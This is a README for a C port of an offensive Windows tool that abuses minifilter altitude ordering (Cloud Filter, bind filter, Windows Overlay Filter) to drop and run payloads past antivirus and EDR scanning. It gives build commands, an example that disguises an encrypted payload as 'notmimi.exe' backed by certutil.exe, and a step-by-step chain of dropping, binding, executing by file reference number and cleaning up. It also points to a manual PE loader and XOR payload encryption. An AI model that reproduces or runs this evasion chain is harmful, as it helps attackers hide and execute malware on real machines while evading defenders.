# Puzzle_C

Pure C port of [Puzzle](https://github.com/Kudaes/Puzzle) (originally written in Rust by Kudaes).

Abuses Windows minifilter architecture — specifically the altitude ordering of `CldFlt` (180451), `bindflt` (409800), and `Wof` (40700) — to drop and execute payloads while evading AV/EDR static file scanning.

## Components

| File | Description | Admin? |
|------|-------------|--------|
| `sync_provider.c` | Cloud Filter API sync provider with double hydration | No |
| `bindlinks.c` | Create/remove bind filter links | Yes |
| `id_mapper.c` | Execute files by FRN (spawn or manual PE map) | Yes |
| `wof_provider.c` | WIM-backed placeholder via Windows Overlay Filter | Yes |
| `utils.c` | Helpers: oplock, loaddll, query file ID | No |

## Build

### MSVC (recommended)

Open a **Developer Command Prompt** and run:

```
build.cmd
```

### MinGW / GCC

```
build.cmd
```

The script auto-detects GCC if MSVC is not available.

### Manual

```
cl /O2 /W3 bindlinks.c /link /SUBSYSTEM:CONSOLE
cl /O2 /W3 utils.c /link /SUBSYSTEM:CONSOLE
cl /O2 /W3 wof_provider.c /link /SUBSYSTEM:CONSOLE
cl /O2 /W3 sync_provider.c shlwapi.lib /link /SUBSYSTEM:CONSOLE
cl /O2 /W3 id_mapper.c ntdll.lib /link /SUBSYSTEM:CONSOLE
```

Binaries are placed in `bin/`.

## Scripts

| Script | Description |
|--------|-------------|
| `scripts/xor_file.py` | XOR encrypt/decrypt payload files |
| `scripts/get_wim_hash.py` | Extract SHA-1 resource hash from WIM (requires wimlib) |

## Usage

See the full technical documentation in the research repo or the original [Puzzle README](https://github.com/Kudaes/Puzzle).

### Quick example: SyncProvider (Mode 2)

```
sync_provider.exe
Sync root directory: C:\Temp\SyncRoot
Backing file 1 (benign file): C:\Windows\System32\certutil.exe
Backing file 2 (payload): payload.enc
Placeholder name: notmimi.exe
Decryption key: MyKey
Select mode (1 or 2): 2
```

### Quick example: Full chain

```
rem 1. Drop via sync_provider (mode 2)
rem 2. Query FRN
utils.exe query C:\Temp\SyncRoot\payload.exe
rem    or: fsutil file queryfileid C:\Temp\SyncRoot\payload.exe
rem 3. Bind
bindlinks.exe create C:\Temp\SyncRoot\payload.exe C:\Windows\System32\certutil.exe
rem 4. Execute by FRN
id_mapper.exe
rem 5. Cleanup
bindlinks.exe remove C:\Temp\SyncRoot\payload.exe
```

## Differences from Rust original

- **No litcrypt** — strings are plaintext (add your own obfuscation)
- **No dinvoke_rs** — uses direct `LoadLibraryA`/`GetProcAddress` (appears in IAT)
- **Manual PE loader** in `id_mapper.c` load mode (Rust delegates to `dinvoke_rs::manualmap`)
- Smaller binaries, zero dependencies beyond Windows SDK

## Requirements

- Windows 10/11/Server
- Minifilters must be present: `bindflt`, `CldFlt`, `Wof` (verify with `fltmc`)
- Admin for BindLinks, WOFProvider, IdMapper
- User-level for SyncProvider
